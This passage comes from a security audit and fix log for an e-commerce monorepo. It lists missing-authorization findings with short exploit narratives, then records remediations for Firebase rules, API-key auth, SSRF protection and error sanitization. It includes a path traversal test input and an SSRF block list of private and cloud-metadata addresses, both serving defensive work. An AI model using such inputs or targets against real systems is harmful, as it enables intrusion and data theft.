- [ ] Update vulnerable dependencies
- [ ] Sanitize error messages
- [ ] Protect SEO notify/audit endpoints with auth or cron secrets
- [ ] Restrict shop list + discount listing endpoints
- [ ] Full security regression test suite

#### Gate 3: Go-Live
- [ ] External penetration test
- [ ] Load testing (ensure rate limits hold)
- [ ] Monitoring and alerting configured
- [ ] Incident response runbook documented
- [ ] Security review sign-off

#### Gate 4: Ongoing
- [ ] Weekly dependency audits
- [ ] Quarterly pen tests
- [ ] Secret rotation every 90 days
- [ ] CI/CD secret scanning (TruffleHog/Gitleaks)

### Bottom Line

**Do not deploy to production until Gate 1 and Gate 2 are complete.** The current state has multiple trivially exploitable vulnerabilities that would result in immediate compromise. The plan's timeline is optimistic - budget 6-8 weeks of focused security work before production launch, not "2 weeks for high severity items."

Updated: 2026-01-14
Reviewer: Claude Opus 4.5

---

## Additional Audit Findings (Codex - 2026-01-15)

These findings are newly identified in this follow-up review and are incorporated into the updated summary counts and plan gates.

### COD-H1. Unauthenticated Email Campaign Endpoints

- Severity: HIGH
- CWE/OWASP: CWE-862 (Missing Authorization); OWASP A01 (Broken Access Control)
- Component paths: `apps/cms/src/app/api/marketing/email/route.ts`, `apps/cms/src/app/api/campaigns/route.ts`
- Risk: Unauthenticated callers can send campaigns, list metrics, and spam recipients, risking deliverability bans and reputational damage.
- Exploit narrative: An attacker POSTs to `/cms/api/marketing/email` or `/cms/api/campaigns` with arbitrary `to`, `subject`, and `body` and triggers outbound email at scale.
- Minimal patch: Require authenticated admin sessions and shop ownership checks; enforce CSRF protection; rate limit; restrict recipients to validated segments.
- Test: Integration tests assert 401/403 for unauthenticated callers and allow only authorized admins to send campaigns.

### COD-H2. Unauthenticated CMS Content Management Endpoints

- Severity: HIGH
- CWE/OWASP: CWE-862 (Missing Authorization); OWASP A01 (Broken Access Control)
- Component paths: `apps/cms/src/app/api/segments/route.ts`, `apps/cms/src/app/api/library/route.ts`, `apps/cms/src/app/api/comments/[shop]/[pageId]/route.ts`, `apps/cms/src/app/api/comments/[shop]/[pageId]/[commentId]/route.ts`
- Risk: Attackers can modify segmentation rules, inject or delete library components, and alter internal comments across any shop.
- Exploit narrative: An attacker POSTs/PATCHes to these endpoints with crafted payloads to tamper with CMS content or spam collaborators.
- Minimal patch: Require authenticated sessions for all methods; enforce shop-level authorization; add rate limiting to comment creation.
- Test: Integration tests verify unauthenticated requests return 401/403 and authorized users can access only their shops.

### COD-H3. Unauthenticated RBAC User Enumeration

- Severity: HIGH
- CWE/OWASP: CWE-200 (Exposure of Sensitive Information); OWASP A05 (Security Misconfiguration)
- Component paths: `apps/cms/src/app/api/rbac/users/route.ts`
- Risk: Exposes user names/emails to unauthenticated callers, enabling targeted phishing and account enumeration.
- Exploit narrative: Attacker calls `/cms/api/rbac/users` to collect names/emails for social engineering.
- Minimal patch: Require admin authorization; return only minimal metadata or remove endpoint in production; add audit logging.
- Test: Integration test ensures unauthenticated requests are rejected and admin access is required.

### COD-M1. Unauthenticated SEO Audit Endpoint Enables Resource Exhaustion

- Severity: MEDIUM
- CWE/OWASP: CWE-400 (Uncontrolled Resource Consumption); OWASP A04 (Insecure Design)
- Component paths: `apps/cms/src/app/api/seo/audit/[shop]/route.ts`
- Risk: Lighthouse runs are CPU-intensive; unauthenticated access allows DoS via repeated POSTs.
- Exploit narrative: An attacker loops POST requests to run Lighthouse and exhaust server resources.
- Minimal patch: Require authenticated access or a cron secret; rate limit; queue Lighthouse runs with concurrency limits.
- Test: Integration test ensures 401/403 for unauthenticated callers; load test verifies rate limits.

### COD-M2. Public Shop and Discount Enumeration

- Severity: MEDIUM
- CWE/OWASP: CWE-200 (Exposure of Sensitive Information); OWASP A05 (Security Misconfiguration)
- Component paths: `apps/cms/src/app/api/shops/route.ts`, `apps/cms/src/app/api/marketing/discounts/route.ts` (GET)
- Risk: Exposes internal shop IDs and discount codes, enabling targeted abuse or scraping.
- Exploit narrative: Attacker enumerates shop IDs and discount codes, then abuses the codes across storefronts.
- Minimal patch: Require authenticated admin access for listing; scope discounts to authorized shops; create separate public endpoints if needed.
- Test: Integration tests ensure unauthenticated requests are rejected and access is scoped.

### COD-L1. Pagination Parameters Lack Upper Bounds

- Severity: LOW
- CWE/OWASP: CWE-770 (Allocation of Resources Without Limits or Throttling); OWASP A04 (Insecure Design)
- Component paths: `apps/cms/src/app/api/sections/[shop]/route.ts`
- Risk: Excessive `page` values can cause large offsets and unnecessary work.
- Exploit narrative: An attacker uses extreme `page` values to trigger inefficient queries and degrade performance.
- Minimal patch: Add upper bounds for `page`/offset and return 400 when exceeded.
- Test: Unit test asserts oversized page values are rejected.

---

## Fix Log

### 2026-01-21: Firebase Rules Security Fixes (Critical #2 and #3)

**Files changed:**
- Created `apps/prime/database.rules.json` — New secure Firebase rules
- Created `apps/prime/scripts/migrate-user-roles.ts` — Data migration script

**Critical #2 Fix: Removed timestamp bypass**
- Old: `.read/.write: "auth != null || now < 1819007200000"` (allowed unauthenticated access until 2027)
- New: `.read/.write: "auth != null"` (requires authentication)

**Critical #3 Fix: Replaced hardcoded role indices with role map**
- Old role structure: `roles: ['owner', 'staff']` or `roles: { '0': 'owner', '1': 'staff' }`
- New role structure: `roles: { owner: true, staff: true }`
- Old check: `roles/0 == 'owner' || roles/1 == 'owner' || roles/2 == 'owner'`
- New check: `roles/owner == true`

**Migration required:**
1. Deploy new Firebase rules to Firebase Console
2. Run migration script to convert existing user data:
   ```bash
   cd apps/prime
   FIREBASE_SERVICE_ACCOUNT_KEY=/path/to/service-account.json npx tsx scripts/migrate-user-roles.ts --dry-run
   # Review output, then run without --dry-run to apply
   ```

**Testing:**
- Verify unauthenticated requests to Firebase are rejected
- Verify users with `roles: { staff: true }` can still access appropriate paths
- Verify owners/developers can still manage user profiles

### 2026-01-21: CMS Media Endpoints Shop-Level Authorization (High #13)

**Files changed:**
- Modified `packages/types/src/CmsUser.ts` — Added `allowedShops?: string[]` field
- Modified `apps/cms/src/auth/next-auth.d.ts` — Extended Session, User, JWT types with `allowedShops`
- Modified `apps/cms/src/auth/options.ts` — Propagate `allowedShops` through JWT/session callbacks
- Modified `apps/cms/src/actions/common/auth.ts` — Added `ensureShopAccess()` and `ensureShopReadAccess()` helpers
- Modified `apps/cms/src/app/api/media/route.ts` — Use shop-level auth for all endpoints
- Modified `apps/cms/src/app/api/media/__tests__/route.test.ts` — Mock new auth functions

**Security improvement:**
- Before: Any authenticated CMS user could access media for ANY shop
- After: Users must have explicit shop access via `allowedShops` array, or be a global admin

**Access control rules:**
- Global admins (`role: "admin"`) can access all shops
- Other roles require explicit shop assignment in `user.allowedShops`
- Wildcard `"*"` in `allowedShops` grants access to all shops
- Unauthenticated requests return 401, unauthorized shop access returns 403

**Migration notes:**
- Existing admin users continue to work (global access)
- Non-admin users need `allowedShops` populated to access specific shops
- Add shops to user records in `data/cms/users.json`:
  ```json
  {
    "3": {
      "id": "3",
      "name": "Shop Admin",
      "email": "shopadmin@example.com",
      "password": "$argon2...",
      "allowedShops": ["my-shop", "other-shop"]
    }
  }
  ```

### 2026-01-21: Product-Pipeline API Authentication (High #12)

**Files changed:**
- Created `apps/product-pipeline/src/lib/auth.ts` — API key validation module
- Modified `apps/product-pipeline/src/lib/api-context.ts` — Added auth middleware to `withPipelineContext`
- Modified `apps/product-pipeline/src/routes/api/_lib/db.ts` — Added `PIPELINE_API_KEY` and `PIPELINE_ENV` to `PipelineEnv` type
- Modified `apps/product-pipeline/wrangler.toml` — Added documentation for API key configuration

**Security improvement:**
- Before: All product-pipeline API endpoints were completely unauthenticated
- After: All endpoints require API key authentication via `Authorization: Bearer <key>`, `X-API-Key` header, or `api_key` query parameter

**Authentication flow:**
1. `withPipelineContext` calls `validateApiKey()` before invoking the handler
2. In production (`PIPELINE_ENV` != "dev"), requests without valid API key return 401
3. In dev mode, unauthenticated requests are allowed for local testing
4. If `PIPELINE_API_KEY` is not configured in production, returns 500 error

**API key validation features:**
- Supports Bearer token, X-API-Key header, and query parameter
- Uses constant-time comparison to prevent timing attacks
- Explicit error messages: `missing_api_key`, `invalid_api_key`, `auth_not_configured`

**Deployment required:**
1. Generate a secure API key (e.g., `openssl rand -base64 32`)
2. Set as Cloudflare secret: `wrangler secret put PIPELINE_API_KEY`
3. Update `PIPELINE_ENV` to "production" in production deployment
4. Update all clients to include API key in requests

**Testing:**
- Verify unauthenticated requests return 401 in production mode
- Verify requests with valid API key succeed
- Verify invalid API keys return 401
- Verify dev mode allows unauthenticated requests

### 2026-01-21: CMS Marketing/Content/RBAC Endpoint Authorization (COD-H1, COD-H2, COD-H3)

**Files changed:**
- Modified `apps/cms/src/app/api/campaigns/route.ts` — Added `ensureAuthorized()` for POST
- Modified `apps/cms/src/app/api/marketing/email/route.ts` — Changed to shop-level auth (`ensureShopAccess`, `ensureShopReadAccess`)
- Modified `apps/cms/src/app/api/segments/route.ts` — Added shop-level auth for all methods
- Modified `apps/cms/src/app/api/library/route.ts` — Added shop-level auth for all methods
- Modified `apps/cms/src/app/api/comments/[shop]/[pageId]/route.ts` — Added shop-level auth for GET/POST
- Modified `apps/cms/src/app/api/comments/[shop]/[pageId]/[commentId]/route.ts` — Added shop-level auth for PATCH/DELETE
- Modified `apps/cms/src/app/api/rbac/users/route.ts` — Added `ensureAuthorized()` for GET
- Modified `apps/cms/__tests__/marketingEmailApi.test.ts` — Added mocks for new auth functions

**COD-H1 Fix: Marketing email endpoints**
- `/api/campaigns` POST: Added `ensureAuthorized()` (was completely unauthenticated)
- `/api/marketing/email` GET: Changed to `ensureShopReadAccess(shop)`
- `/api/marketing/email` POST: Changed to `ensureShopAccess(shop)`

**COD-H2 Fix: Content management endpoints**
- `/api/segments` GET: Added `ensureShopReadAccess(shop)`
- `/api/segments` POST/DELETE: Added `ensureShopAccess(shop)`
- `/api/library` GET: Added `ensureShopReadAccess(shop)`
- `/api/library` POST/PATCH/DELETE: Added `ensureShopAccess(shop)`
- `/api/comments/[shop]/[pageId]` GET: Added `ensureShopReadAccess(shop)`
- `/api/comments/[shop]/[pageId]` POST: Added `ensureShopAccess(shop)`
- `/api/comments/[shop]/[pageId]/[commentId]` PATCH/DELETE: Added `ensureShopAccess(shop)`

**COD-H3 Fix: RBAC user enumeration**
- `/api/rbac/users` GET: Added `ensureAuthorized()` (was exposing all user names/emails)

**Testing:**
- Verify unauthenticated requests return 401
- Verify unauthorized shop access returns 403
- Verify authorized requests succeed
- Test: `pnpm --filter @apps/cms jest __tests__/marketingEmailApi.test.ts` passes

### 2026-01-21: OAuth Provider Callback Authorization (High #7)

**Files changed:**
- Modified `apps/cms/src/app/api/providers/[provider]/route.ts` — Added shop-level auth and shop name validation
- Modified `apps/cms/src/app/api/providers/[provider]/__tests__/route.test.ts` — Updated auth mocks

**Security improvements:**
- Changed from `ensureAuthorized()` to `ensureShopAccess(shop)` for shop-level access control
- Added `validateShopName()` to prevent path traversal attacks
- Users can now only connect OAuth providers to shops they have access to

**Testing:**
- Verify unauthenticated requests return 401
- Verify unauthorized shop access returns 403
- Verify path traversal attempts (e.g., `shop=../other`) are rejected

### 2026-01-21: Test Auth Bypass Verification (High #5)

**Status:** Already secure - no code changes needed

**Analysis:**
The `CMS_TEST_ASSUME_ADMIN` bypass in `apps/cms/src/actions/common/auth.ts` is already properly protected:
1. Requires `process.env.NODE_ENV === "test"` (line 31, 58, 95, 142, 178)
2. Requires `CMS_TEST_ASSUME_ADMIN === "1"`
3. Requires `!__NEXTAUTH_MOCK_SET` (tests that explicitly mock auth bypass this)

In production builds, `NODE_ENV` is set to `"production"` at build time by Next.js and cannot be changed at runtime. The bypass cannot trigger in production.

### 2026-01-21: Inventory Endpoint Shop-Level Authorization (High #10)

**Files changed:**
- Modified `apps/cms/src/app/api/data/[shop]/inventory/[sku]/route.ts` — Changed from role-based to shop-level auth

**Security improvements:**
- Before: Used `ensureRole(["admin", "ShopAdmin"])` which allowed any admin to modify ANY shop's inventory
- After: Uses `ensureShopAccess(shop)` which requires explicit access to the specific shop

**Testing:**
- Verify unauthenticated requests return 401
- Verify users without access to shop return 403
- Verify users with shop access can modify inventory

### 2026-01-21: CMS Preview Link Security (High #8)

**Files changed:**
- Modified `apps/cms/src/app/api/page-versions/[shop]/[pageId]/[versionId]/preview-link/route.ts` — Added auth, Argon2id hashing, TTL
- Modified `apps/cms/src/app/api/page-versions/preview/[token]/route.ts` — Added TTL check, Argon2 verify, timing-safe legacy hash comparison

**Security improvements:**

1. **Authentication on link creation**: Added `ensureAuthorized()` check before creating preview links
2. **Argon2id password hashing**: Replaced weak SHA-256 with Argon2id for new passwords
3. **TTL/expiration**: Preview links now expire after 24 hours (configurable via `PREVIEW_LINK_TTL_HOURS` env var)
4. **Timing-safe legacy hash comparison**: Legacy SHA-256 hashes now use `crypto.timingSafeEqual()` to prevent timing attacks
5. **Backwards compatibility**: Existing SHA-256 hashed links continue to work until they're recreated

**Configuration:**
- `PREVIEW_LINK_TTL_HOURS`: Optional env var to configure link expiration (default: 24 hours)

**Testing:**
- Verify unauthenticated link creation returns 401/403
- Verify authorized users can create links
- Verify expired links return 401
- Verify Argon2 password verification works
- Verify legacy SHA-256 hashes still work (backwards compatibility)
- Test: `pnpm --filter @apps/cms jest --testPathPattern='page-versions.*preview'` passes

**Tech debt notes:**
- Password is still accepted via URL query param (`?pw=...`) for backwards compatibility with existing shared links. This exposes passwords in browser history, server logs, and referrer headers. Consider adding a POST endpoint or header-based auth for new integrations.
- No automatic cleanup of expired links from the store file. Links remain in storage after expiration (just rejected on access). Consider a periodic cleanup job.

### 2026-01-21: Rate Limiting IP Header Fix (High #6, #20)

**Files changed:**
- Modified `apps/cms/src/lib/server/rateLimiter.ts` — Updated `getClientIp()` to prioritize CF-Connecting-IP
- Modified `apps/cms/src/app/api/auth/[...nextauth]/route.ts` — Added `getClientIp()` function with trusted header priority
- Modified `apps/prime/src/app/api/find-booking/route.ts` — Updated `getClientIp()` to prioritize CF-Connecting-IP

**Security improvements:**

1. **Trusted header priority**: Changed IP extraction to use this order:
   - `CF-Connecting-IP` (Cloudflare-set, cannot be spoofed)
   - `X-Real-IP` (reverse proxy-set, trusted if proxy is trusted)
   - `X-Forwarded-For` (fallback only, can be spoofed)

2. **Impact**: Prevents rate limit bypass via header spoofing. Attackers can no longer rotate IPs in X-Forwarded-For to evade throttling.

**Already correct implementations (no changes needed):**
- `apps/xa/src/lib/rateLimit.ts`
- `apps/xa-j/src/lib/rateLimit.ts`
- `apps/xa-b/src/lib/rateLimit.ts`
- `apps/cover-me-pretty/src/app/api/ai/**`
- `apps/prime/functions/api/find-booking.ts` (Cloudflare Functions)
- `apps/prime/functions/api/guest-session.ts` (Cloudflare Functions)

**Testing:**
- Verify requests with CF-Connecting-IP use that header for rate limiting
- Verify X-Forwarded-For spoofing does not bypass rate limits when CF header is present
- No automated tests needed - this is infrastructure configuration

### 2026-01-21: SSRF Protection for Webhook Forwarding (High #9)

**Files changed:**
- Created `packages/platform-core/src/utils/safeWebhook.ts` — Safe webhook utility with SSRF protection
- Modified `packages/platform-core/src/utils/index.ts` — Export safeWebhookFetch
- Modified `apps/cover-me-pretty/src/app/api/leads/route.ts` — Use safeWebhookFetch instead of raw fetch
- Modified `packages/platform-core/src/services/stockAlert.server.ts` — Use safeWebhookFetch instead of raw fetch

**Security improvements:**

1. **Private IP blocking**: Blocks requests to:
   - Localhost (`127.0.0.0/8`, `::1`)
   - Private networks (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`)
   - Link-local (`169.254.0.0/16` — includes AWS metadata service)
   - Cloud metadata services (`metadata.google.internal`, `kubernetes.*`)
   - Reserved/test networks (TEST-NET-1, TEST-NET-2, TEST-NET-3)
   - Multicast and reserved ranges

2. **Protocol enforcement**: Only allows `http:` and `https:` protocols

3. **Request timeouts**: 5-second default timeout prevents slow-loris attacks

4. **Automatic retries**: Exponential backoff (100ms, 200ms, 400ms) for transient failures

5. **Malformed URL handling**: Rejects invalid URLs by default (fail-safe)

**API:**
```typescript
import { safeWebhookFetch, isPrivateURL } from "@acme/platform-core/utils";

// Check if URL is private (for validation)
if (isPrivateURL(webhookUrl)) {
  throw new Error("Cannot use private/internal URLs");
}

// Safe webhook fetch with SSRF protection
const result = await safeWebhookFetch(webhookUrl, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify(data),
  timeout: 5000,  // optional, default 5000ms
  retries: 2,     // optional, default 2
});

if (!result.ok) {
  console.error(`Webhook failed: ${result.error} after ${result.attempts} attempts`);
}
```

**Testing:**
- Verify `isPrivateURL()` blocks localhost, private IPs, and metadata services
- Verify `safeWebhookFetch()` returns error for private URLs without making a request
- Verify timeout triggers abort after configured milliseconds
- Verify retries work with exponential backoff

### 2026-01-21: Demo Credentials Removal (High #8)

**Files changed:**
- Modified `apps/cover-me-pretty/src/app/api/login/route.ts` — Removed hardcoded credentials, added production gate

**Security improvements:**

1. **Removed hardcoded credentials**: Replaced `CUSTOMER_STORE` with environment-based configuration
2. **Production gate**: Local auth is now blocked in production via `process.env.NODE_ENV === "production"` check
3. **Password hashing**: Changed from plaintext comparison to Argon2id verification
4. **Environment-based configuration**: Credentials now loaded from `LOCAL_AUTH_USERS` env var as JSON

**Configuration (dev/test only):**
```bash
# Generate password hash
npx argon2 hash "mypassword"

# Set env var
LOCAL_AUTH_USERS='{"testuser":{"passwordHash":"$argon2id$v=19$m=65536,t=3,p=4$...","role":"customer"}}'
```

**Testing:**
- Verify local auth returns 404 in production mode
- Verify local auth works in development with valid `LOCAL_AUTH_USERS`
- Verify Argon2 password verification works correctly

### 2026-01-21: Error Message Sanitization (High #11)

**Files changed:**
- Created `packages/platform-core/src/utils/safeError.ts` — Error sanitization utility
- Modified `packages/platform-core/src/utils/index.ts` — Export safeError utilities
- Modified `apps/cms/src/app/api/cart/handlers/utils.ts` — Sanitized `serverError` function
- Modified `apps/cover-me-pretty/src/app/api/orders/[id]/route.ts` — Sanitized GET/PATCH errors
- Modified `apps/cover-me-pretty/src/app/api/delivery/route.ts` — Sanitized pickup errors
- Modified `apps/cover-me-pretty/src/app/api/tax/route.ts` — Sanitized tax calculation errors
- Modified `apps/cover-me-pretty/src/app/api/shipping-rate/route.ts` — Sanitized shipping rate errors
- Modified `apps/cms/src/app/api/library/route.ts` — Sanitized GET/PATCH/DELETE errors
- Modified `apps/cms/src/app/api/edit-changes/route.ts` — Sanitized error
- Modified `apps/cms/src/app/api/themes/route.ts` — Sanitized POST error
- Modified `apps/cms/src/app/api/themes/[themeId]/route.ts` — Sanitized PATCH error
- Modified `apps/cms/src/app/api/pages/[shop]/route.ts` — Sanitized GET/POST errors

**Security improvements:**

1. **Generic error messages**: All sanitized endpoints now return generic messages like "Failed to fetch order" instead of raw error details
2. **Server-side logging**: Full error details are logged server-side with `console.error()` for debugging
3. **Safe error utility**: Created `safeError.ts` with:
   - `sanitizeError()` - Logs full error, returns safe message
   - `safeErrorJson()` - Returns safe JSON error response
   - `isSafeErrorMessage()` - Checks if message is safe for clients
   - Pattern matching for sensitive data (passwords, tokens, stack traces, etc.)

**API for new code:**
```typescript
import { sanitizeError, safeErrorJson } from "@acme/platform-core/utils";

// Option 1: Sanitize caught errors
try {
  await operation();
} catch (err) {
  const safe = sanitizeError(err, "INTERNAL_ERROR", "api/users");
  return NextResponse.json({ error: safe.message }, { status: 500 });
}

// Option 2: Return predefined safe errors
return NextResponse.json(safeErrorJson("NOT_FOUND"), { status: 404 });
```

**Testing:**
- Verify errors returned to clients don't contain stack traces, file paths, or database details
- Verify server logs still contain full error information
- Check that whitelisted safe messages pass through
